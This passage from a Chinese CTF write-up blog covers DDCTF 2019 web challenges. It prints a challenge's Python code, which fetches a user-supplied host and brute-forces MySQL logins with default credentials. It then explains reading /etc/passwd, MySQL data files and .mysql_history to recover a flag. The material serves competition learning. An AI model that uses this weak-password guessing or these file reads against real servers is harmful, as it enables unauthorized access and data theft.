</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>tmp_agent_result</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>tem_result</span> <span class=o>=</span> <span class=n>tmp_agent_result</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>tem_result</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;code&#34;</span><span class=p>:</span> <span class=mi>404</span><span class=p>,</span> <span class=s2>&#34;msg&#34;</span><span class=p>:</span> <span class=s2>&#34;æå¡å¨æªå¼å¯mysql&#34;</span><span class=p>,</span> <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=n>result</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>tmp_result</span> <span class=o>=</span><span class=n>mysql_scan</span><span class=p>(</span><span class=n>target_ip</span><span class=p>,</span> <span class=n>target_port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>tmp_result</span><span class=p>[</span><span class=s1>&#39;Flag&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>tem_result</span> <span class=o>=</span> <span class=n>tmp_agent_result</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>tem_result</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;code&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;msg&#34;</span><span class=p>:</span> <span class=s2>&#34;æªæ«æåºå¼±å£ä»¤&#34;</span><span class=p>,</span> <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=p>[]})</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>tem_result</span> <span class=o>=</span> <span class=n>tmp_agent_result</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>tem_result</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>tmp_result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s2>&#34;code&#34;</span><span class=p>:</span> <span class=mi>0</span><span class=p>,</span> <span class=s2>&#34;msg&#34;</span><span class=p>:</span> <span class=s2>&#34;æå¡å¨å­å¨å¼±å£ä»¤&#34;</span><span class=p>,</span> <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=n>result</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>checkip</span><span class=p>(</span><span class=n>ip</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>compile</span><span class=p>(</span><span class=s1>&#39;^((25[0-5]|2[0-4]\d|[01]?\d\d?)\.)</span><span class=si>{3}</span><span class=s1>(25[0-5]|2[0-4]\d|[01]?\d\d?)$&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>p</span><span class=o>.</span><span class=n>match</span><span class=p>(</span><span class=n>ip</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>curl</span><span class=p>(</span><span class=n>url</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>tmp</span> <span class=o>=</span> <span class=n>Popen</span><span class=p>([</span><span class=s1>&#39;curl&#39;</span><span class=p>,</span> <span class=n>url</span><span class=p>,</span> <span class=s1>&#39;-L&#39;</span><span class=p>,</span> <span class=s1>&#39;-o&#39;</span><span class=p>,</span> <span class=s1>&#39;content.log&#39;</span><span class=p>],</span> <span class=n>stdout</span><span class=o>=</span><span class=n>PIPE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>tmp</span><span class=o>.</span><span class=n>wait</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>tmp</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_agent_result</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>port</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>str_port</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://&#39;</span><span class=o>+</span><span class=n>ip</span> <span class=o>+</span> <span class=s1>&#39;:&#39;</span> <span class=o>+</span> <span class=n>str_port</span>
</span></span><span class=line><span class=cl>    <span class=n>curl</span><span class=p>(</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=s1>&#39;content.log&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;æªå¼å¯agent&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;content.log&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp_list</span> <span class=o>=</span> <span class=n>f1</span><span class=o>.</span><span class=n>readlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>response</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>tmp_list</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=s1>&#39;content.log&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=s1>&#39;mysqld&#39;</span> <span class=ow>in</span> <span class=n>response</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>response</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>response</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ip2long</span><span class=p>(</span><span class=n>ip_addr</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>unpack</span><span class=p>(</span><span class=s2>&#34;!L&#34;</span><span class=p>,</span> <span class=n>inet_aton</span><span class=p>(</span><span class=n>ip_addr</span><span class=p>))[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>is_inner_ipaddress</span><span class=p>(</span><span class=n>ip</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ip</span> <span class=o>=</span> <span class=n>ip2long</span><span class=p>(</span><span class=n>ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>ip2long</span><span class=p>(</span><span class=s1>&#39;127.0.0.0&#39;</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>24</span> <span class=o>==</span> <span class=n>ip</span> <span class=o>&gt;&gt;</span> <span class=mi>24</span> <span class=ow>or</span> \
</span></span><span class=line><span class=cl>            <span class=n>ip2long</span><span class=p>(</span><span class=s1>&#39;10.0.0.0&#39;</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>24</span> <span class=o>==</span> <span class=n>ip</span> <span class=o>&gt;&gt;</span> <span class=mi>24</span> <span class=ow>or</span> \
</span></span><span class=line><span class=cl>            <span class=n>ip2long</span><span class=p>(</span><span class=s1>&#39;172.16.0.0&#39;</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>20</span> <span class=o>==</span> <span class=n>ip</span> <span class=o>&gt;&gt;</span> <span class=mi>20</span> <span class=ow>or</span> \
</span></span><span class=line><span class=cl>            <span class=n>ip2long</span><span class=p>(</span><span class=s1>&#39;192.168.0.0&#39;</span><span class=p>)</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span> <span class=o>==</span> <span class=n>ip</span> <span class=o>&gt;&gt;</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>mysql_scan</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span> <span class=n>port</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>port</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>port</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>weak_user</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;root&#39;</span><span class=p>,</span> <span class=s1>&#39;admin&#39;</span><span class=p>,</span> <span class=s1>&#39;mysql&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>weak_pass</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;mysql&#39;</span><span class=p>,</span> <span class=s1>&#39;root&#39;</span><span class=p>,</span> <span class=s1>&#39;admin&#39;</span><span class=p>,</span> <span class=s1>&#39;test&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>Flag</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>user</span> <span class=ow>in</span> <span class=n>weak_user</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>pass_wd</span> <span class=ow>in</span> <span class=n>weak_pass</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>mysql_login</span><span class=p>(</span><span class=n>ip</span><span class=p>,</span><span class=n>port</span><span class=p>,</span> <span class=n>user</span><span class=p>,</span> <span class=n>pass_wd</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=n>Flag</span> <span class=o>=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>                <span class=n>tmp_dic</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;weak_user&#39;</span><span class=p>:</span> <span class=n>user</span><span class=p>,</span> <span class=s1>&#39;weak_passwd&#39;</span><span class=p>:</span> <span class=n>pass_wd</span><span class=p>,</span> <span class=s1>&#39;Flag&#39;</span><span class=p>:</span> <span class=n>Flag</span><span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>tmp_dic</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>tmp_dic</span> <span class=o>=</span> <span class=p>{</span><span class=s1>&#39;weak_user&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;weak_passwd&#39;</span><span class=p>:</span> <span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=s1>&#39;Flag&#39;</span><span class=p>:</span> <span class=n>Flag</span><span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>tmp_dic</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>mysql_login</span><span class=p>(</span><span class=n>host</span><span class=p>,</span> <span class=n>port</span><span class=p>,</span> <span class=n>username</span><span class=p>,</span> <span class=n>password</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;mysql login check&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span> <span class=o>=</span> <span class=n>MySQLdb</span><span class=o>.</span><span class=n>connect</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>host</span><span class=o>=</span><span class=n>host</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>user</span><span class=o>=</span><span class=n>username</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>passwd</span><span class=o>=</span><span class=n>password</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>port</span><span class=o>=</span><span class=n>port</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>connect_timeout</span><span class=o>=</span><span class=mi>1</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=p>(</span><span class=s2>&#34;[H:</span><span class=si>%s</span><span class=s2> P:</span><span class=si>%s</span><span class=s2> U:</span><span class=si>%s</span><span class=s2> P:</span><span class=si>%s</span><span class=s2>]Mysql login Success&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>,</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>),</span><span class=s2>&#34;Info&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>conn</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>MySQLdb</span><span class=o>.</span><span class=n>Error</span><span class=p>,</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span> <span class=p>(</span><span class=s2>&#34;[H:</span><span class=si>%s</span><span class=s2> P:</span><span class=si>%s</span><span class=s2> U:</span><span class=si>%s</span><span class=s2> P:</span><span class=si>%s</span><span class=s2>]Mysql Error </span><span class=si>%d</span><span class=s2>:&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>host</span><span class=p>,</span><span class=n>port</span><span class=p>,</span><span class=n>username</span><span class=p>,</span><span class=n>password</span><span class=p>,</span><span class=n>e</span><span class=o>.</span><span class=n>args</span><span class=p>[</span><span class=mi>0</span><span class=p>]),</span><span class=s2>&#34;Error&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>False</span>
</span></span></code></pre></div><p>可以读<code>/etc/passwd</code>拿到 mysql 的路径，然后根据 mysql 的路径与 flag 在数据库中的位置提示，我们可以直接读<code>/var/lib/mysql/security/flag.ibd</code>中可以拿到 flag，也可以读<code>/var/lib/mysql/ibdata1</code>，只是这个文件一般比较大。</p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004554.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004554.jpg loading=lazy></a></figure></p><p>也有师傅说可以读<code>.mysqlhistory</code></p><p><figure><a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005095.jpg><img src=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005095.jpg loading=lazy></a></figure></p><p><code>.mysql_history</code>虽然读不到数据库内容，但是在这里可以看到这里出题者是用了<code>insert</code>，我们可以看到他的操作的语句，也拿到了 flag</p><p>这里可以读到吃鸡那题的代码，路径为<code>/home/dc2-user/ctf_web_1/web_1/main/views.py</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>jsonify</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span><span class=n>redirect</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>app</span> <span class=kn>import</span> <span class=n>mongodb</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>app.unitis.tools</span> <span class=kn>import</span> <span class=n>get_md5</span><span class=p>,</span> <span class=n>num64_to_32</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>app.main.db_tools</span> <span class=kn>import</span> <span class=n>get_balance</span><span class=p>,</span> <span class=n>creat_env_db</span><span class=p>,</span> <span class=n>search_bill</span><span class=p>,</span> <span class=n>secrity_key</span><span class=p>,</span> <span class=n>get_bill_id</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>uuid</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>urllib</span> <span class=kn>import</span> <span class=n>unquote</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>mydb</span> <span class=o>=</span> <span class=n>mongodb</span><span class=o>.</span><span class=n>db</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;DDCTF{chiken_dinner_hyMCX[n47Fx)}&#39;&#39;&#39;</span>
</span></span></code></pre></div><h2 id=web-8-web-再来1杯java>Web 8 WEB 再来1杯Java</h2><h3 id=description-7>Description</h3><p>{% colorquote info %}</p><p>绑定Host访问：</p><p>116.85.48.104 c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com</p><p><a class=link href=http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/ target=_blank rel=noopener>http://c1n0h7ku1yw24husxkxxgn3pcbqu56zj.ddctf2019.com:5023/</a></p><p>{% endcolorquote %}</p><h3 id=hacking-7>Hacking</h3><p>比赛的时候搞不出来…赛后复现看起来得搞挺多的…还是另开一篇写吧。</p></section><footer class=article-footer><section class=article-tags><a href=/tags/CTF/>CTF</a>
<a href=/tags/wp/>wp</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg><span>Licensed under CC BY-NC-SA 4.0</span></section><div class="notice notice-tip"><div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br></div></footer></article><aside class=related-contents--wrapper><h2 class=section-title>Related contents</h2><div class=related-contents><div class="flex article-list--tile"><article><a href=/2020/04/24/Plaid-CTF-2020-Web-2/><div class=article-details><h2 class=article-title>Plaid CTF 2020 Catalog</h2></div></a></article><article><a href=/2020/04/20/Plaid-CTF-2020-Web-1/><div class=article-details><h2 class=article-title>Plaid CTF 2020 Contrived Web Problem Write Up</h2></div></a></article><article><a href=/2019/06/04/2019qwb/><div class=article-details><h2 class=article-title>2019强网杯部分Web wp</h2></div></a></article><article><a href=/2019/05/30/2019iscc/><div class=article-details><h2 class=article-title>2019 ISCC Web wp</h2></div></a></article><article><a href=/2019/05/09/2019ciscn-RefSpace/><div class=article-details><h2 class=article-title>2019 CISCN RefSpace</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script type=application/javascript>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//ZeddYu.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{DISQUS&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
2018 -
2022 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous></main><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#web1-滴>Web1 滴～</a><ol><li><a href=#description>Description</a></li><li><a href=#hacking>Hacking</a></li></ol></li><li><a href=#web-2-web-签到题>Web 2 WEB 签到题</a><ol><li><a href=#description-1>Description</a></li><li><a href=#hacking-1>Hacking</a></li></ol></li><li><a href=#web-3-upload-img>Web 3 Upload-IMG</a><ol><li><a href=#description-2>Description</a></li><li><a href=#hacking-2>Hacking</a></li></ol></li><li><a href=#web-4-homebrew-event-loop>Web 4 homebrew event loop</a><ol><li><a href=#description-3>Description</a></li><li><a href=#hacking-3>Hacking</a></li></ol></li><li><a href=#web-5-欢迎报名ddctf>Web 5 欢迎报名DDCTF</a><ol><li><a href=#description-4>Description</a></li><li><a href=#hacking-4>Hacking</a></li></ol></li><li><a href=#web-6-大吉大利今晚吃鸡>Web 6 大吉大利，今晚吃鸡～</a><ol><li><a href=#description-5>Description</a></li><li><a href=#hacking-5>Hacking</a></li></ol></li><li><a href=#web-7-web-mysql弱口令>Web 7 WEB mysql弱口令</a><ol><li><a href=#description-6>Description</a></li><li><a href=#hacking-6>Hacking</a></li></ol></li><li><a href=#web-8-web-再来1杯java>Web 8 WEB 再来1杯Java</a><ol><li><a href=#description-7>Description</a></li><li><a href=#hacking-7>Hacking</a></li></ol></li></ol></nav></div></section></aside></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master//ts/main.js defer></script>
<script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("/sw.js")})</script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>